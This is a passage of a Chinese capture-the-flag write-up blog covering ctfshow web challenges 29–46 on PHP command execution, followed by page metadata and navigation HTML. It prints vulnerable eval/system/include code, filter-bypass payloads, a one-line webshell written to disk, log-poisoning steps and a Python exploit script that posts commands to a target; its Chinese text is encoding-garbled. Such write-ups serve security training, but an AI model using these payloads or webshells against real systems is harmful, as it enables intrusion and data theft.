fl*g.phpâ€);\nc=system(â€œcat fl*g.phpâ€);ï¼ˆç”¨catè¦å³é”®æŸ¥çœ‹æºä»£ç æ‰èƒ½çœ‹åˆ°å›æ˜¾ï¼‰\nc=system(â€œcp fl*g.php a.txt â€œ);ï¼ˆè®¿é—®a.txtæŸ¥çœ‹ï¼‰\nc=system(â€™echo -e \" \u003c?php \\n error_reporting(0); \\n $c= $_GET['c']; \\n eval($c); \" \u003e a.phpâ€™); //ç›´æ¥æ–°å»ºä¸€ä¸ªé¡µé¢å¹¶å†™å…¥ä¸€å¥è¯æœ¨é©¬ ï¼ˆ/a.php?c=system(â€œtac flag.phpâ€);ï¼‰\n?c=echo `tac fla*`;\nâ€¦.\nweb30 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:42:26 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é‡Œè¿‡æ»¤äº†å…³é”®å­—flagï¼Œsystemè¿˜æœ‰phpï¼Œç”±äºè¿‡æ»¤äº†systemæˆ‘ä»¬éœ€è¦ä½¿ç”¨å…¶ä»–çš„ç³»ç»Ÿå‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\npayload:\nc=printf(exec(â€œcat%20fl*â€));\nc=echo exec(â€œcat f\\lag.p\\hpâ€);\nc=show_source(scandir(â€.â€)[2]); (è¿™ä¸ªå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåŒ…å«å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•é¡¹çš„æ•°ç»„)\nc=highlight_file(next(array_reverse(scandir(â€.â€))));\nc=passthru(â€œtac fla*â€);\nc=echo `tac fla*`;\nc=$a=sys;$b=tem;$c=$a.$b;$c(â€œtac fla*â€);*\nc=echo shell_exec(â€œtac fla*â€);\nc=eval($_GET[1]);\u00261=system(â€œtac flag.phpâ€);\nc=passthru(base64_decode(â€œY2F0IGZsYWcucGhw==â€));(base64ç»•è¿‡)\nâ€¦â€¦\nweb31 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:49:10 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'\npayload:\nc=eval($_GET[1]);\u00261=system(â€œtac flag.phpâ€); c=show_source(scandir(getcwd())[2]); c=show_source(next(array_reverse(scandir(pos(localeconv()))))); c=passthru(â€œtac%09fla*â€); c=echo`tac%09fla*`; web32 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 00:56:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ 18 eval($c); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é¢˜å±è”½äº†å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(\nè¿‡æ»¤äº†ç©ºæ ¼å¯ä»¥ç”¨${IFS}å’Œ%0a ä»£æ›¿ï¼Œåˆ†å·å¯ä»¥ç”¨?\u003eä»£æ›¿\nç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nå¾—åˆ°çš„ç»“æœç”¨base64è§£ç ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†\næˆ–è€…ç”¨æ—¥å¿—æ³¨å…¥ï¼š\nurl/?c=include$_GET[1]?%3E\u00261=../../../../var/log/nginx/access.log /var/log/nginx/access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯\nweb33 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 02:22:27 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12// 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\\"/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½çš„å…³é”®è¯æ¯”ä¸Šä¸€é¢˜å¤šäº†ä¸ªåŒå¼•å· /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|\"\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb34 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½çš„å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb35 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\\u003c|\\=/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®è¯ /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"|\u003c|=\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼šï¼ˆwsmè¿˜èƒ½ç§’ï¼‰\nurl/?c=include$_GET[1]?\u003e\u00261=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[1]?\u003e\u00261=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb36 1\u003c?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-04 00:12:34 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-04 04:21:16 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(|\\:|\\\"|\\\u003c|\\=|\\/|[0-9]/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®å­— /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\"|\u003c|=|/|[0-9]\nä¸æ˜¯å“¥ä»¬ï¼Œæ•°å­—ä¹Ÿè¦å±è”½ï¼Œé‚£æˆ‘æ”¹ä¸€ä¸‹ä¸å°±å¥½äº†\nç»§ç»­ä½¿ç”¨includeæ„é€ payloadï¼š\nurl/?c=include$_GET[m]?\u003e\u0026m=php://filter/convert.base64-encode/resource=flag.php\næˆ–è€…\nurl/?c=include$_GET[m]?\u003e\u0026m=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb37 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:18:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} ä¸æ˜¯å“¥ä»¬ï¼Œæ€ä¹ˆè¿˜æ˜¯æ–‡ä»¶åŒ…å«\npayloadï¼š\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\næˆ–è€…\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb38 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:23:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag|php|file/i\", $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} payload:\n?c=data://text/plain,\u003c?=system(\"tac%20fla*\")?\u003e\næˆ–è€…\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb39 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:13:21 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET['c'])){ 16 $c = $_GET['c']; 17 if(!preg_match(\"/flag/i\", $c)){ 18 include($c.\".php\"); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} è¿™é‡Œä¼šåœ¨æˆ‘ä»¬ä¼ å…¥çš„cåé¢æ‹¼æ¥ä¸€æ®µ.php\næˆ‘ä»¬åªéœ€è¦åœ¨åŠ å…¥\u003c?php ?\u003eé‚£ä¹ˆphpå°±åªä¼šæ‰§è¡Œä¸­é—´çš„ä»£ç ï¼Œåé¢çš„å†…å®¹ä¸ä¼šæ‰§è¡Œ\næ•…payloadï¼š\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\nweb40 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:03:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13 14if(isset($_GET['c'])){ 15 $c = $_GET['c']; 16 if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\\u003c|\\.|\\\u003e|\\/|\\?|\\\\\\\\/i\", $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} å±è”½å…³é”®è¯ /[0-9]|~|`|@|#|\\$|%|^|\u0026|*|\\ï¼ˆ|\\ï¼‰|-|=|+|{|[|]|}|:|'|\"|,|\u003c|.|\u003e|/|?|\\\\\nè¿™é‡Œè¦ä½¿ç”¨æ— å‚å‘½ä»¤æ‰§è¡Œ\npayloadï¼š\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\nå…³äºæ— å‚å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›è§£é‡Š\nweb41 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: ç¾½ 6# @Date: 2020-09-05 20:31:22 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:40:07 9# @email: 1341963450@qq.com 10# @link: https://ctf.show 11 12*/ 13 14if(isset($_POST['c'])){ 15 $c = $_POST['c']; 16if(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i', $c)){ 17 eval(\"echo($c);\"); 18 } 19}else{ 20 highlight_file(__FILE__); 21} 22?\u003e è¿‡æ»¤å†…å®¹ï¼š/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i\nè¿™ä¸ªé¢˜è¿‡æ»¤äº†$ã€+ã€-ã€^ã€~ä½¿å¾—å¼‚æˆ–è‡ªå¢å’Œå–åæ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦|ã€‚ æˆ‘ä»¬å¯ä»¥å°è¯•ä»asciiä¸º0-255çš„å­—ç¬¦ä¸­ï¼Œæ‰¾åˆ°æˆ–è¿ç®—èƒ½å¾—åˆ°æˆ‘ä»¬å¯ç”¨çš„å­—ç¬¦çš„å­—ç¬¦ã€‚\nå¤§ä½¬çš„è„šæœ¬\n1\u003c?php 2$myfile = fopen(\"rce_or.txt\", \"w\"); 3$contents=\"\"; 4for ($i=0; $i \u003c 256; $i++) { 5\tfor ($j=0; $j \u003c256 ; $j++) { 6 7\tif($i\u003c16){ 8\t$hex_i='0'.dechex($i); 9\t} 10\telse{ 11\t$hex_i=dechex($i); 12\t} 13\tif($j\u003c16){ 14\t$hex_j='0'.dechex($j); 15\t} 16\telse{ 17\t$hex_j=dechex($j); 18\t} 19\t$preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i'; 20\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 21\techo \"\"; 22 } 23 24\telse{ 25\t$a='%'.$hex_i; 26\t$b='%'.$hex_j; 27\t$c=(urldecode($a)|urldecode($b)); 28\tif (ord($c)\u003e=32\u0026ord($c)\u003c=126) { 29\t$contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; 30\t} 31\t} 32 33} 34} 35fwrite($myfile,$contents); 36fclose($myfile); 1# -*- coding: utf-8 -*- 2import requests 3import urllib 4from sys import * 5import os 6os.system(\"php rce_or.php\") #æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ 7if(len(argv)!=2): 8 print(\"=\"*50) 9 print('USERï¼špython exp.py ') 10 print(\"egï¼š python exp.py http://ctf.show/\") 11 print(\"=\"*50) 12 exit(0) 13url=argv[1] 14def action(arg): 15 s1=\"\" 16 s2=\"\" 17 for i in arg: 18 f=open(\"rce_or.txt\",\"r\") 19 while True: 20 t=f.readline() 21 if t==\"\": 22 break 23 if t[0]==i: 24 #print(i) 25 s1+=t[2:5] 26 s2+=t[6:9] 27 break 28 f.close() 29 output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" 30 return(output) 31 32while True: 33 param=action(input(\"\\n[+] your functionï¼š\") )+action(input(\"[+] your commandï¼š\")) 34 data={ 35 'c':urllib.parse.unquote(param) 36 } 37 r=requests.post(url,data=data) 38 print(\"\\n[*] result:\\n\"+r.text) å°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿è¡Œexp.pyå³å¯\nç¾½å¸ˆå‚…nb\næ³¨æ„é“¾æ¥è¦ç”¨httpä¸èƒ½ç”¨https\nweb42 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 20:51:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 18}else{ 19 highlight_file(__FILE__); 20} è¿™é“é¢˜ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å‘½ä»¤ä¸\" \u003e/dev/null 2\u003e\u00261\"è¿›è¡Œæ‹¼æ¥\n/dev/null 2\u003e\u00261 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° /dev/null å³ä¸å›æ˜¾\nå¯¼è‡´æˆ‘ä»¬æ— æ³•æˆåŠŸæ‰§è¡Œ\næˆ‘ä»¬å¯ä»¥é€šè¿‡%0aæˆªæ–­çš„æ–¹å¼ç»•è¿‡\ntac fl*%0a\nor\n; //åˆ†å· | //åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤ || //åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤ \u0026 //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ \u0026\u0026 //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ\nè¿‡æ»¤äº†åˆ†å·å’Œcatï¼Œå¯ä»¥ç”¨||å’Œ\u0026æ¥ä»£æ›¿åˆ†å·ï¼Œtacä»£æ›¿cat\nå¯æ„é€ playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 æ³¨æ„ï¼Œè¿™é‡Œçš„\u0026éœ€è¦urlç¼–ç \nweb43 è¿‡æ»¤äº†catã€ï¼›ï¼Œ\nä¸æ˜¯å¾ˆå½±å“\ntac fl*%0a or tac flag.php|| ... //è®°å¾—è½¬urlç¼–ç  web44 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:32:01 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 if(!preg_match(\"/;|cat|flag/i\", $c)){ 18 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†;|cat|flag\nå°é—®é¢˜\ntac fl*%0a or tac f*|| ... //è®°å¾—è½¬urlç¼–ç  web45 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:35:34 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 if(!preg_match(\"/\\;|cat|flag| /i\", $c)){ 18 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†;|cat|flagå’Œç©ºæ ¼\nå¯ä»¥ç”¨%09æˆ–$IFS$9ä»£æ›¿ç©ºæ ¼\ntac%09fl*%0a or tac%09f*|| or echo$IFS`tac$IFS*`%0A ... //è®°å¾—è½¬urlç¼–ç  web46 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } è¿‡æ»¤æœ‰ç‚¹å¤šå•Š\n;|cat|flag| |[0-9]|\\$|*\nä½†æ˜¯äº‹å®ä¸Šæˆ‘ä»¬ä¸Šé¢˜ä½¿ç”¨çš„æ–¹æ³•å¹¶ä¸ä¼šå—åˆ°å½±å“ï¼Œå› ä¸º%09æ˜¯urlç¼–ç ï¼Œä¸ä¼šè¢«å½“æˆæ•°å­—è¿‡æ»¤\ntac%09fl*%0a or tac%09f*|| or tac",
  "wordCount" : "57490",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-02-20T00:15:50+08:00",
  "dateModified": "2025-02-20T00:15:50+08:00",
  "author":{
    "@type": "Person",
    "name": "Sonny Calcr"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/ctfshow_web/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/categories/" title="Categories">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>æ ‡ç­¾</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="æœç´¢">
                    <span>æœç´¢</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Ctfshow sqlç¯‡
      <span class="entry-hint" title="Draft">
        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
          <path
            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
        </svg>
      </span>
    </h1>
    <div class="post-meta"><span title='2025-02-20 00:15:50 +0800 CST'>2025-02-20</span>&nbsp;Â·&nbsp;115 åˆ†é’Ÿ&nbsp;Â·&nbsp;Sonny Calcr

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">ç›®å½•</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#ctfshow_web" aria-label="CTFshow_Web">CTFshow_Web</a><ul>
                        <ul>
                        
                <li>
                    <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%ae%8c%e5%b7%a5" aria-label="ä¿¡æ¯æ”¶é›†ï¼šï¼ˆå®Œå·¥ï¼‰">ä¿¡æ¯æ”¶é›†ï¼šï¼ˆå®Œå·¥ï¼‰</a><ul>
                        
                <li>
                    <a href="#web-1-5" aria-label="Web 1-5">Web 1-5</a></li>
                <li>
                    <a href="#web6" aria-label="Web6">Web6</a></li>
                <li>
                    <a href="#web7" aria-label="web7">web7</a></li>
                <li>
                    <a href="#web8" aria-label="web8">web8</a></li>
                <li>
                    <a href="#web9" aria-label="web9">web9</a></li>
                <li>
                    <a href="#web10" aria-label="web10">web10</a></li>
                <li>
                    <a href="#web11" aria-label="web11">web11</a></li>
                <li>
                    <a href="#web12" aria-label="web12">web12</a></li>
                <li>
                    <a href="#web13" aria-label="web13">web13</a></li>
                <li>
                    <a href="#web14" aria-label="web14">web14</a></li>
                <li>
                    <a href="#web15" aria-label="web15">web15</a></li>
                <li>
                    <a href="#web16" aria-label="Web16">Web16</a></li>
                <li>
                    <a href="#web17" aria-label="web17">web17</a></li>
                <li>
                    <a href="#web18" aria-label="web18">web18</a></li>
                <li>
                    <a href="#web19" aria-label="web19">web19</a></li>
                <li>
                    <a href="#web20" aria-label="web20">web20</a></li></ul>
                </li>
                <li>
                    <a href="#%e7%88%86%e7%a0%b4%e5%ae%8c%e5%b7%a5" aria-label="çˆ†ç ´ï¼šï¼ˆå®Œå·¥ï¼‰">çˆ†ç ´ï¼šï¼ˆå®Œå·¥ï¼‰</a><ul>
                        
                <li>
                    <a href="#web21" aria-label="web21">web21</a></li>
                <li>
                    <a href="#web22" aria-label="web22">web22</a></li>
                <li>
                    <a href="#web23" aria-label="web23">web23</a></li>
                <li>
                    <a href="#web24" aria-label="web24">web24</a></li>
                <li>
                    <a href="#web25" aria-label="web25">web25</a></li>
                <li>
                    <a href="#web26" aria-label="web26">web26</a></li>
                <li>
                    <a href="#web27" aria-label="web27">web27</a></li>
                <li>
                    <a href="#web28" aria-label="web28">web28</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" aria-label="å‘½ä»¤æ‰§è¡Œï¼š">å‘½ä»¤æ‰§è¡Œï¼š</a><ul>
                        
                <li>
                    <a href="#web29" aria-label="web29">web29</a></li>
                <li>
                    <a href="#web30" aria-label="web30">web30</a></li>
                <li>
                    <a href="#web31" aria-label="web31">web31</a></li>
                <li>
                    <a href="#web32" aria-label="web32">web32</a></li>
                <li>
                    <a href="#web33" aria-label="web33">web33</a></li>
                <li>
                    <a href="#web34" aria-label="web34">web34</a></li>
                <li>
                    <a href="#web35" aria-label="web35">web35</a></li>
                <li>
                    <a href="#web36" aria-label="web36">web36</a></li>
                <li>
                    <a href="#web37" aria-label="web37">web37</a></li>
                <li>
                    <a href="#web38" aria-label="web38">web38</a></li>
                <li>
                    <a href="#web39" aria-label="web39">web39</a></li>
                <li>
                    <a href="#web40" aria-label="web40">web40</a></li>
                <li>
                    <a href="#web41" aria-label="web41">web41</a></li>
                <li>
                    <a href="#web42" aria-label="web42">web42</a></li>
                <li>
                    <a href="#web43" aria-label="web43">web43</a></li>
                <li>
                    <a href="#web44" aria-label="web44">web44</a></li>
                <li>
                    <a href="#web45" aria-label="web45">web45</a></li>
                <li>
                    <a href="#web46" aria-label="web46">web46</a></li>
                <li>
                    <a href="#web47" aria-label="web47">web47</a></li>
                <li>
                    <a href="#web48" aria-label="web48">web48</a></li>
                <li>
                    <a href="#web49" aria-label="web49">web49</a></li>
                <li>
                    <a href="#web50" aria-label="web50">web50</a></li>
                <li>
                    <a href="#web51" aria-label="web51">web51</a></li>
                <li>
                    <a href="#web51-1" aria-label="web51">web51</a></li>
                <li>
                    <a href="#web52" aria-label="web52">web52</a></li>
                <li>
                    <a href="#web54" aria-label="web54">web54</a></li>
                <li>
                    <a href="#web55" aria-label="web55">web55</a></li>
                <li>
                    <a href="#web56" aria-label="web56">web56</a></li>
                <li>
